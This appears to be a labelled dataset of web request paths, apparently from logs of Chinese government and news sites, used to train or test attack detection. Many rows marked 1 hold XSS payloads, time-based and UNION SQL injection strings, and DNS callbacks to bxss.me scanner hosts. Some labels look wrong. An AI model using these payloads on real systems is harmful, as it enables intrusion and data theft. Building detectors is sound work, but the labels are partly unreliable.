request	label
/*****/gy42/cpgyss.asp?key=\u03e1\ufffd\ufffd&l2=\ufffd\ufffd\u05a6\ufffd\ufffd&l=\ufffd\u0134\ufffd	0
"/******/cms/www/201607/15171839f46w.jpg/*/-->'""""></iframe></script></style></title></textarea><script >alert(46364)</script>"	1
/****/whs/yw_1286/201701/t20170103_314514.html	0
/0'xor(if(now()=sysdate(),sleep(15),0))xor'z/**/encrypt/jbase64.js	1
/*******/config.js	1
/***/blockdata/getsearchinfo.do?&title=\u8c46\u6cb9	0
/******/703987.html	0
/**********/system/2020/12/18/013304974.shtml	0
/****/mtgz/2012mtgz/201412/t20141218_44681.html	0
/****/system/2021/11/30/javascript:window.close();	1
/****/zfwjn/1088/1110/bxss.me/t/xss.html?	1
/****/\u02eb\u02ae\u04bb	0
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bf\u56fe\u4e66\u9986\u7efc\u5408\u670d\u52a1\u90e8	0
/*******/201905/201905211547061118.html	0
/****/zgsdt/2021_qydt/202105/\u534e\u6da6\u6c34\u6ce5_files/crc_log2_cn.png	0
/******/system/2019/06/27/012914767.shtml	0
/******/resource/code/datainput.jsp?owner=1329914701&e=1&w=1920&h=1080&treeid=1001&refer=ahr0chm6ly93d3cuymfpzhuuy29tl2xpbms/dxjspuhsvjznx0htuezxnkiwoxzuemzmyklznkfvoxjpdvhvte00ofa3nkl5uv9prhryzmfwr3llejjenm8tajh3evamd2q9jmvxawq9ztc3oda4ogewmda1nti4nzawmdawmdaynjfjmdaxnzq=&pagename=l2luzgv4lmpzca==&newsid=-1	0
"/******/qgbzdh/db/index.shtml/<img src=""javascript:alert(539)"">"	1
"/****/rdjy/\""javascript:void(0)\"""	1
/zwxx_11337/****/202104/t20210420_2792217.html	0
/******/scy_gj_shpinzl_06.jpg	0
"/***/getlist?data={""channel_id"":""12216"",""channel_type"":""4"",""page"":1,""page_size"":15}"	0
/**********/system/2020/12/06/javascript:void();	1
/****/0830/227407.shtml	0
/****/ajax_cmd.php?cmd=completgraphyrecording&filename=<img src=a onload=alert(777)>	1
/****/wdsjs/hfswsj/202109/t20210906_http://bxss.me/t/fit.txt?.jpg.html	1
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u827e\u5c1a\u7f8e\u5bb9\u9662	0
"/************/categorysearch.do?cateid=1&eq=1&oq=1&p="""" """"a"""".concat(70-3).concat(22*4).concat(97).concat(68).concat(114).concat(77) (require""""socket""""
socket.gethostbyname(""""hitkz"""" """"easamjta9e603.bxss.me."""")[3].to_s) """"&pg=15&pos=1&pq=1&q=«Î ‰»Îπÿº¸¥ &ranksign=1&searchid=1&total=1&tpl=16&websiteid=110105008056111"	1
/***/0/01/93/64/1936481_989253.jpg	0
/***/0/02/03/38/2033865_490913.jpg	0
/****/web/search?channelid=222832&searchword=\u77f3\u5634\u5c71\u5e02\u60e0\u519c\u533a\u9a6c\u4e16\u5fe0\u725b\u8089\u62c9\u9762\u9986	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u56db\u5b63\u978b\u5e97	0
"/"""" """"a"""".concat(70-3).concat(22*4).concat(102).concat(80).concat(112).concat(75) (require""""socket""""
socket.gethostbyname(""""hitkh"""" """"ibbotibv8416c.bxss.me."""")[3].to_s) """"/**/lib/easyui/plugins/jquery.window.js"	1
/****/bmkx/scl/202108/w020210809628985375220.png	0
/****/zfxxgk1/zfxxgkzd'||'/1.htm	1
/****/nvysev-hynews-e112290744.html	0
/**/ui/widgets/scrollup/css/if(now()=sysdate(),sleep(15),0)/image.css	1
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u767d\u9e4f\u6da6\u6ed1\u6cb9\u7ecf\u9500\u90e8	0
/*******/qiye/b-e2046076.html	0
/**********/system/2021/12/20/013497250.shtml	0
/****/b-e487767.html	0
/****/iindex.jsp?cat_id=24992	0
/******/download/down.jsp?i_id=194814&colid=72;select sleep(5)	1
/_nuxt/********/select/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
"/****/zpdt/202010/t20201009_254278.html"" and ""x""=""x"	1
/images'||'/***/main.css	1
"/****/mobiledoc/jsp/ccmr/clientportal/login.jsp?strmessage=<img src=/ onerror=""alert(777)""/>"	1
/zwxx_11337/****/201609/t20160923_303714.html	0
/****/bmkx/swgxj/201703/t20170328_86930.html	0
/**********/system/2020/05/11/013158893.shtml	0
/******/2008syj/css/2008sjy.css	0
/****/javascript:window.external.addfavorite('http://www.qhnews.com/****/','÷–π≤«‡∫£ °ŒØ¡ÏµºªÓ∂Ø±®µ¿ºØ');?wsdl	1
/****************/notification/negotiate?access_token=a9a31757-b3ad-4833-9155-2c33b7a9f9e9	0
/************//xfs.bxss.me/jcse/website.js	1
/enjoymobilexcx_mt/****/getpicverifycode?mobile=112306298&type=\u9884\u7ea6&dt=1640016438542	0
/***/mysubscribe	0
/******/main202004282100000420273799568.jpg	0
/*******/202106/202106240854291000.html?undefined=undefined	0
"/**/ui/lib/' 'a'.concat(70-3).concat(22*4).concat(108).concat(74).concat(102).concat(79) (require'socket'
socket.gethostbyname('hitxz' 'cryipehm45601.bxss.me.')[3].to_s) '/plugins/jquery.linkbutton.js"	1
"/****/czgk/bmjs/zzqzfzcbmyzstsjg/zzqzrzyt/\""javascript:void(0)\"""	1
/*****/system/2021/11/17/javascript:window.close();	1
/zwxx_11337/****/zcjd/202102/t20210220_2602170.html	0
/************/risk-disclosure/2017-0'xor(if(now()=sysdate(),sleep(9),0))xor'z-16/673.html	1
/****/zzxxgk/bmmzj/xxgkml/jytabl/201907/t20190723_140169.html	0
/******/system/2020/11/03/013277076.shtml	0
/****/20210205/9401.html	0
/**********/system/2020/05/31/013174362.shtml	0
/**********/system/2021/10/31/013472692.shtml	0
/*****/gy42/cpgyss.asp?key=\ufffd\ufffd\ufffd\ufffd\u04e1\ufffd\ufffd&l2=\ufffd\ufffd\ufffd\ufffd&l=\ufffd\ufffd\ufffd\ufffd	0
/****/qzfwj/201801/t20180115_668668.html	0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u5546\u4e1a\u6539\u9769	0
/****/system/count/0036001/017000000000/window.location.href	1
/****/gccb/myjzgcsj/	0
/************/template/jcse/110105008056111/16//xfs.bxss.me/main.css	1
/***/system/2008/08/19/002581566.shtml	1
/*****/gy48/cpgyss.asp?key=\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd	0
/**/zwxmtjz/tj/wx/201908/w020190822694529332894.jpg	0
/**********/system/2021/10/27/013471316.shtml	0
/**********/system/more/2010000/0001/2010000_00000176.shtml	0
/**********/2021-10-19.html	0
/***/resource/css/common.min.css	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u4e2a\u4f53\u7ecf\u8425\u66e6\u6668\u767e\u8d27\u5e97	0
/***/0/00/88/54/885454_733171.jpg	0
/******/ew/20161024134858619.jpg	0
/**/viewspace-353.html	0
/*****/b-e1170737.html	0
"/*****/dsp_editcreative.cfm?attributes.siteid="""">alert(777)"	1
/***/interface/daily_clickcount.json.jsp?callback=jquery171015978205117905753_1639991164344	0
/*******/gjgcjsyjzx	0
/*******/qiye/b-e2307315.html	0
/****/b-e1109198.html	0
/****/20200514/e100963670.html	1
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u58a8\u66f2\u670d\u88c5\u5e97	0
/**/system/count/0006016/000000000000/count_page_list_0006016000000000000.js	0
/****/mswpmm/common/newaccount.aspx?email=alert(777)	1
/******/visitcount/visit.jsp?i_columnid=1&i_webid=1&type=1' and 'x'='y	1
/******/usercenter/index?qrcode=quicklyrq,3,14091,805244	0
/****/tzgg/201912/*	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u7ef4\u660e\u517b\u8702\u573a	0
/wp-content/*******/azonpop/files/view/showpopup.php?popid=null /*!00000union*/ select 1,2,/*!00000group_concat(unhex(hex(md5(1234))),0x3c2f62723e,unhex(hex(md5(1234))))*/,4,5 /*!00000from*/ wp_users	1
/****/20211021/javascript:void(0);	1
/****/0908/795651.shtml	0
/*****/system/2011/03/10/010304833.shtml	0
/****/xxgkml/qtfdxx/zfgb/202001/p020200114571890758403.pdf	0
/****************/notification/negotiate?access_token=8ada2f80-4f18-4294-b60f-ded8b1e65034	0
/***********/shangpinqihuo/nongchanpin/2021-01-14/if(now()=sysdate(),sleep(12),0).html	1
/**********/system/2020/10/09/013260959.shtml	0
/****/zt/nlkfxjjsyq/syqtp/201612/w020170730377739594830.jpg	0
/****/2020jnxc/yxzp/202006/w020200701492362511191.jpg	0
/****/xqdt/pcq/201706/t20170621_91777.html	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u534e\u6587\u76db\u533b\u7597\u5668\u68b0\u6709\u9650\u516c\u53f8	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u6d25\u5b8f\u5546\u52a1\u4e2d\u5fc3	0
/**********/system/2021/03/05/013345446.shtml	0
/*****/system/2013/01/16/011001919.shtml	1
/*******/qiye/b-e2234649.html	0
/*****/system/2009/05/13/002739987.shtml	0
"/********/""""><script>alert`76524`</script>"	1
/***************/cpsms/20210407/9654.html	0
/****/user/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1)	1
/***/0/01/95/44/1954467_863416.jpg	0
"/****/zzxxgk/tjj/zfxxgkml_'""""()&%<acx><script >8m5j(9133)</script>/xwfbh_2065/list.html"	1
/****/gjgk/zzjg/\u534e\u6da6\u6c34\u6ce5_files/crc_log2_cn.png	0
/****/system/2021/08/04/javascript:void(0);	1
/****/jjdytpgjz/202112/t20211206_197336.html	0
/****/zfwjn/1088/1091/list.html?new='.gethostbyname(lc('hitxx'.'cjsdturb68be0.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(100).chr(70).chr(99).chr(77).'	1
/module'||'/***/jpage/theme/simple/css/jpage.css	1
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u5c0f\u4e54\u5bb6\u9910\u996e\u6709\u9650\u516c\u53f8	0
/****/web/search?channelid=222832&searchword=\u76d0\u6c60\u53bf\u7ea2\u80dc\u95e8\u5e02\u90e8	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u767b\u51e1\u7efc\u5408\u95e8\u5e02\u90e8	0
/******/ylgg/	0
/****/bmkx/sfgw/202010/w020201016630197125007.png	0
/****/system/2020/12/04/javascript:dozoom(9)	1
/***/blockdata/articlelist_4g3.do?channelarticlelist_4g3_channelid_ss=channelid&channelid=yuanchuang°Ëtpage=4&query=java	0
/******/system/2012/07/08/010820877.shtml	0
/*****/bt	0
/***********/jinrongqihuo/0'xor(if(now()=sysdate(),sleep(6),0))xor'z/index_9.html	1
/****/czgk/bmyjs/rmtt/cl/201602/t20160214_318461.html	0
/****/finderview/api.php?callback=jquery211027821724654516156_1466662510279}}1c027<script>alert(777)</script>cf2ea&type=get&mode=0&_=1466662510280	1
/****/bmkx/jtysj/202011/t20201126_174355.html	0
/*******/qiye/b-e422925.html	0
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtdarvxuqeygv7xgconvtkhe=&openid=ovl7jjhrovtoomihzx_rampolpn0&outer_str=38459&activate_ticket=fdzv9emqaffrnr3xboqhb3wxvi1e2xs/cqw68mioswnhfifidrt1ejnprxbtx1zvgtmzeyzk7svaitsjpfyzgp1pwhrpwef1w8oeblb9/qo=	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u4f17\u5174\u519c\u4e1a\u89c2\u5149\u65c5\u6e38\u4e13\u4e1a\u5408\u4f5c\u793e	0
/***/0/01/92/81/1928113_219432.jpg	0
/****/index_13.html	0
/****/xqdt/jtx/201610/t20161025_44153.html	0
/****/bxss.me/t/xss.html?	1
/****/czgk/bmyjs/zzqjcyxt/xqqrmjcy/	0
/****/web/search?channelid=222832&searchword=\u897f\u5409\u53bf\u5f69\u8272\u6253\u5370\u90e8	0
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u5b8f\u8c6b\u62db\u5f85\u6240	0
/****/system/2021/11/10/javascript:window.print()	1
/*****/gy48/cpgyss.asp?key=\u5de5\u4e1a\u6da6\u6ed1\u6cb9\u7f51&l=\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd	0
/cgi-bin/*****/index.php?o=panel&a=receiver.edit&id=alert(777)	1
/******/visitcount/visit.jsp?i_columnid=0'xor(if(now()=sysdate(),sleep(15),0))xor'z&i_webid=1&type=1	1
/****/qzfwj/201801/t20180115_669011.html/index_1.html	0
/****/20200722/e103835565.html	0
/****/mswpmm/common/newaccount.aspx?btncreateaccount=alert(777)	1
/***/interface/daily_clickcount.json.jsp?callback=jquery19107764574100069479_1640054261089	0
/****/czgk/bmjs/sydw1/zzqbjj/201808/t20180815_976708.html	0
/*******/qiye/businesses-e42576_2.html?category_id=245343	0
/****/zdlygk/ncwywfgz/if(now()=sysdate(),sleep(12),0)/znx/xmb_gzdxb.htm	1
/***/mobile_h5/waparticledetail.do?article_id=202105281620131222&contenttype=article	0
/****/bmkx/jtysj/201804/t20180404_102120.html	0
/*******/lddt/	0
/******/scy_gj_ldgh_spt_03.png	0
/**********/system/2021/12/18/013496264.shtml	0
"/****/jsly/znzgjdqzdhzbyjs/201610/t20161014_103590.html"" and ""x""=""y"	1
/****/bmkx/ygjt/202007/t20200707_169023.html	0
/****/20211103/javascript:void(0);	1
/**/system/2021/09/28/012203700.shtml	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u76f4\u9500\u4eba\u5e8a\u4e0a\u7528\u54c1\u4e13\u5356\u5e97	0
/*****/gy48/cpgyss.asp?key=\u6811\u8102\u6ee4\u7f51&l=\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd	0
/****/web/search?channelid=222832&searchword=\u7231\u5fb7(\u5b81\u590f)\u6587\u5316\u4f20\u5a92\u6709\u9650\u8d23\u4efb\u516c\u53f8	0
/**********/system/2021/02/16/013337174.shtml	0
/****/dropbox/download?challenge=</script><script>alert(document.domain)</script>	1
/****/yqzt/qyddt/202005/t20200527_247881.html and 1>1	1
/****/http://bxss.me/t/fit.txt?.jpg/tjj/zfxxgkml_2127/jgzn_2042/list.html	1
/***/xwzx/szyw/qywh/sjsb/bqsm/nbfw/kjcx/kycg/zscq/	0
/****/gjjj/	1
"/****/czgk/bmyjs/zzqfyxt/ycxzjrmfy/201903/"">\u5b81\u590f\u516c\u8def\u7ba1\u7406\u4e2d\u5fc3</a>"	0
/**********/system/2020/05/05/013154473.shtml	0
/***/0/01/94/03/1940382_757486.jpg	0
/****/20160714/javascript:void(0);	1
/**********/system/2020/04/24/013148016.shtml	0
/****/zzxxgk/bmsthjj/xxgkml/hjxx/hjwfbgt/202111/t20211122_196777.html	0
/****/xqdt/jtx/201610/t20161025_43968.html	0
/****/zhengce/zfwjn/201801/p020211203415887690110.pdf	0
/*/public/viewclick/?addclick=-1; waitfor delay '0:0:8.629999999999999' -- &classid=243&id=8977	1
/**********/system/2021/11/03/013474803.shtml	0
/****/tzgg/2012tzgg/	0
/****/20200429/e100374945.html	0
/******/usercenter/index?qrcode=82879&code=071o1a000wmnzm1mwe200vhyvb0o1a0e	0
/****/xxgkml//xfs.bxss.me/	1
/******/xsd	0
/zwxx_11337/****/202002/t20200218_1958955.html	0
/****/bysw/http://bxss.me/t/fit.txt/	1
/***/viewspace-628.html	0
/*******/qiye/b-e1031223.html	0
/*****/gy42/ljcpgyview.asp?id=27854678&l2=\ufffd\ufffd\ufffd\ufffd&l=\ufffd\ufffd\ufffd\ufffd	0
/****************/notification/negotiate?access_token=6f175628-70cd-427e-b8e4-fa0e3bf3fd2d	0
/******/system/2017/10/26/javascript:window.print()	1
/****/zt/yqfkzccs/yqfkdt/index_53.html	0
/****/tzgg/2012tzgg/201412/t20141218_40449.html	0
/****/web/search?channelid=222832&searchword=\u7ea2\u5bfa\u5821\u533a\u8fdb\u8fdb\u978b\u5e97	0
"/****/system/2021/04/22/013373702'""/>/</script/>/<svg/onload=alert(2568) width=100//>.shtml"	1
/******/li_zb_huandengpian_11.jpg	0
/****/jsly/nljx/201501/t20150129_52356.html and 1=1	1
/zwxx_11337/****/201410/t20141028_310221.html	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u90ca\u533a\u4f9b\u9500\u793e\u517b\u6b96\u573a\u8857\u574a\u8089\u5e97	0
/zwxx_11337/****/202111/t20211104_3115375.html	0
/***/nbhd/opengovmsgbox.do?method=viewgovmsgbox&siteid=115&metadataid=10062429	0
/****/zzxxgk/zrzyj/zfxxgkml_2139/gggs/202112/t20211217_197916.html	0
/****/system/2016/11/17/012187048.shtml	0
/****//xfs.bxss.me/sz/202108/t20210806_185416.html	1
/****/user/job/lib/ap_resume_workcity.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects)	1
/**********/system/2021/10/22/javascript:void(0);	1
"/****/czgk/bmjs/zzqzfzcbmyzstsjg/zzqswt/201609/"">\u81ea\u6cbb\u533a\u653f\u5e9c\u9a7b\u798f\u5efa\u529e\u4e8b\u5904</a>"	0
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u7eff\u53f6\u65e5\u7528\u54c1\u7ecf\u9500\u90e8	0
/************/template/jcse/110105008056111/16/http://bxss.me/t/fit.txt?.jpg/plugin/voice/voice.css	1
/****/0420/827126.shtml	0
/****/gzxwhydt	0
"/******/jslib/ckplayer/ckplayer.js/""><script>alert(577)</script>?_=1630311519791"	1
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u9f99\u51e4\u9500\u552e\u90e8	0
/****/gccb/gcsg/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/gywm_10175/****/yqlj/xwzx/xydt/nbfw/rlzy/xxgk/kjcx/	0
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrthb4hlyf17p7tn9uwdeymts=&openid=ovl7jjukqppdgcdueqqgzn4-x24i&outer_str=qrscene_mcs,1,315072,148415&activate_ticket=fdzv9emqaffrnr3xboqhb3p1cx4r/h1zmrq4cqj90nthfifidrt1ejnprxbtx1zvr8mw ijpob78wrm5sesun1damny/tefxnce7r38rdwg=	0
/****/gjzqq/index.html?continent=) and 6122=6122#	1
/***/0/00/03/39/33901_997287.jpg	0
/**********/system/2020/06/19/013189112.shtml	0
/****/web/search?page=2&channelid=253477&searchword=1&keyword=1') or 8847=4149	1
/****************/images/crm/default/home/home_swiper_banner1.png	0
/**/system/2021/11/28/javascript:void(0);	1
/****/system/count/0036012/000000000000/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/****/system/2021/11/23/javascript:window.print()	1
/**/system/2007/06/15/002140613.shtml	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u7eff\u679c\u9c9c\u8d85\u5e02	0
"/****/byszf/202109/t20210924_186864.html?leader="""".gethostbyname(lc(""""hitit"""".""""fwzxdcbjfd12d.bxss.me."""")).""""a"""".chr(67).chr(hex(""""58"""")).chr(119).chr(90).chr(108).chr(75)."""""	1
/****/zfxxgk/fdzdgknr/zdxm/jsjz/202001/t20200103_1914378.html	0
/****/wdszs/hfsz/202106/t20210603_183516.html	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u5bcc\u519c\u5bb6\u5bb4\u9910\u5385	0
"/****/rdjy/"""".gethostbyname(lc(""""hitbh"""".""""mecchcyl14392.bxss.me."""")).""""a"""".chr(67).chr(hex(""""58"""")).chr(116).chr(79).chr(115).chr(88).""""/t20201225_2539623.html"	1
"/bi-security-login/login.jsp?msi=false&redirect=""><img/***/onerror=alert(document.domain)>"	1
/****/jtdt/2021_jtyw/202109/t20210922_316987.html	1
/****/tzgg/2014tzgg/201501/images/gj2014_css.css	0
/*****/system/2016/05/23/012011861.shtml	0
/******/_content/download.jsp?urltype=news.downloadattachurl' or 1269=3738 and '1'='1&owner=1707212448&wbfileid=51419	1
/****/20201214/e112271322.html	0
"/***/col16/index.html"""" and """"x""""=""""x"	1
/******/ld_icon01.png	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u7ecf\u6d4e\u5f00\u53d1\u533a\u767d\u5f3a\u70e7\u70e4\u5e97	0
/******/system/2017/05/22/012316724.shtml	0
/******/uploadpic/image/20190603/1559531411934650.jpg	0
/****/web/search?channelid=222832&searchword=\u76d0\u6c60\u53bf\u5361\u5c14\u83f2\u7279\u6b27\u6d3e\u7ae5\u88c5\u5e97	0
"/****/main/myspace/student.php?keyword=31337"""" onmouseover=confirm(777)//&active=0&_qf__search_user=&submit=search"	1
/****/category/yanjiubaogao?page=1 and 6245=6245	1
/************/template/jcse'||'/110105008056111/16/images/result.css	1
/****/tzgg/201812/*	0
/****/qichefuwu_84.html	0
/zwxx_11337/****/202002/t20200217_1958116.html	0
/****/web/search?channelid=222832&searchword=\u7075\u6b66\u5e02\u827a\u84c1\u82d7\u6728\u82b1\u5349\u6709\u9650\u516c\u53f8	0
/**********/system/2021/12/17/013496154.shtml	0
/**********/system/2021/12/18/013496270.shtml	0
/**********/system/2020/05/29/013173472.shtml	0
/***/003/004/353/00300435312_391a7938.jpg	0
/****/xqdt/jtx/202006	0
/****/bmkx/sfgw/201912	0
"/***/telaen/index.php?tid=default&lid=en_uk&f_email="""">alert(777)"	1
"/************/template/jcse/110105008056111/16/images<esi:include src=""""http://bxss.me/rpb.png""""/>/jquery.waterfall.js"	1
/**/mediacenter/news/jc.js	0
/**********/system/2021/10/07/013460865.shtml	0
/***/mswpmm/common/signin.aspx?tbpassword=alert(777)returnurl=/mswpmm/common/default.aspx	1
/**********/system/2021/08/13/013434286.shtml	0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u674e\u4fca\u9547\u6b22\u4e50\u8d2d\u670d\u88c5\u5e97	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u8fdc\u8bda\u7535\u6c14\u710a\u4fee\u7406\u90e8	0
/***/productlistcategory.html?productcategoryid=(select char(97) char(110) char(111) char(110) char(121) char(109) char(111) char(117) char(115) char(95) char(115) char(104) char(111) char(112))&price1=3079&&price2=3319	1
/****/zzxxgk/tjj/zfxxgkml_2127/jgzn_2042/http://bxss.me/t/fit.txt.html	1
/***/interface/url_total_pv.json.jsp?callback=jquery19107529792067820331_1639980115182	0
/****/system/2013/11/14/011233143.shtml	0
/****/bmkx/sfgw/201804/t20180408_102149.html	0
/**********/system/more/2070000/0001/2070000_00000153.shtml	0
"/***/getdetail?data={""news_id"":""1263999"",""diversion_id"":"""",""sign"":""""}"	0
/*******/qiye/b-e2389892.html	0
"/vc"""" and 2*3*8=6*8 and """"jtyk""""=""""jtyk/**/css/page.css"	1
/***/0/00/31/19/311931_640100.jpg	0
/**********/system/2021/09/30/013459222.shtml	0
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u6052\u745e\u8fbe\u5de5\u8d38\u6709\u9650\u516c\u53f8	0
/zwxx_11337/****/202004/t20200416_2036567.html	0
/****/zdlygk/ncwywfgz/zws/znx/xmb_gzdxb'||'.htm	1
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u8096\u6d77\u864e\u5e9f\u65e7\u6536\u8d2d\u7ad9	0
"/****/czgk/bmjs/zzqdwyzfpcjgyzsjgyzssydw/zzqdzj/\""javascript:void(0)\"""	1
/****/xxgknb/2011/list.html?new=bxss.me	1
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtajcytlfzzoa1zuetchgvv8=&openid=ovl7jjrrctuf2r2fqjkheqt_tjzm&outer_str=quicklyrq,3,117927,60522&activate_ticket=fdzv9emqaffrnr3xboqhb2acmytcdnpn xhhwvpw9aboo8dbj5 fzedtzplsmcarv6yy5bgckk1qtpp537cbi51kk kpeggnf5gvsihtysu=	0
/**********/system/2020/04/20/013144806.shtml	0
/__local/*/3f/35/c8da29abef032c1d43a600687a3_3e462038_101eb.png	0
/****/system/2021/12/18/013496460.shtml	0
/******/system/2011/07/10/010407916.shtml	0
/****/bmkx/ygjt/202009/t20200924_172611.html	0
/****/web/search?channelid=222832&searchword=\u9752\u94dc\u5ce1\u5e02\u9c9c\u745e\u98de\u6c34\u679c\u5546\u884c	0
/****/app?adminemail=<script>alert(777)</script>&smtpserver=127.0.0.1&smtpport=25&smtpuser=<script>alert(777)</script>&smtppassword=admin&smtpsecurity=none&proceedbutton=save&operation=config&st=savesmtp	1
